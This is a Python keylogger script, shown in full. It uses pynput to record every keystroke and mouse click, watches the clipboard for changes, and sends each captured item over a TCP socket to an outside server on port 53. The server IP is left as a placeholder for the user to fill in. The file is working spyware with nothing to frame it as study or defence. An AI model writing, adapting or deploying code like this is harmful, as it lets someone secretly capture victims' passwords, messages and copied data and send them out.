from pynput import keyboard, mouse
import socket
import pyperclip

SERVER_ADDRESS = ('***', 53)  # Replace "***" with your server's IP

CLIPBOARD_DATA = "initial value"


def send_data(message):
    
    try:
        # Connecting to server
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((SERVER_ADDRESS[0], int(SERVER_ADDRESS[1])))
        server.send(message.encode())
        server.close()
    except Exception as e:
        print(f'Failed to send data: {e}')

#Log the key pressing and clipboard changes
def on_key_press(key):
    global CLIPBOARD_DATA
    try:
        key_info = f'Keystroke: {key}'
        send_data(key_info)
        
        clipboard_content=pyperclip.paste()
        if CLIPBOARD_DATA!=clipboard_content:
            try:
                data = str(pyperclip.paste())
                data = data.lstrip('Index([')
                data = data.split("], dtype='object'")
                data = data[0]
                clipboard_info = f'Clipboard data: {data}'
                CLIPBOARD_DATA=clipboard_content
                send_data(clipboard_info)
            except Exception as e:
                error_info = 'Failed to fetch clipboard data'
                send_data(error_info)
                print(error_info)
    except Exception as e:
        print(f'Error in on_key_press: {e}')


#Log the clicks and clipboard changes
def on_click(x, y, button, pressed):
    global CLIPBOARD_DATA
    if pressed:
        mouse_info = f'Mouse clicked at ({x}, {y}) with {button}'
        send_data(mouse_info)
        clipboard_content=pyperclip.paste()
        if CLIPBOARD_DATA!=clipboard_content:
            try:
                data = str(pyperclip.paste())
                data = data.lstrip('Index([')
                data = data.split("], dtype='object'")
                data = data[0]
                clipboard_info = f'Clipboard data: {data}'
                CLIPBOARD_DATA=clipboard_content
                send_data(clipboard_info)
            except Exception as e:
                error_info = 'Failed to fetch clipboard data'
                send_data(error_info)
                print(error_info)
        

# Setting up the listeners
keyboard_listener = keyboard.Listener(on_press=on_key_press)
mouse_listener = mouse.Listener(on_click=on_click)

# Starting the listeners
keyboard_listener.start()
mouse_listener.start()

# Keeping the script running
keyboard_listener.join()
mouse_listener.join()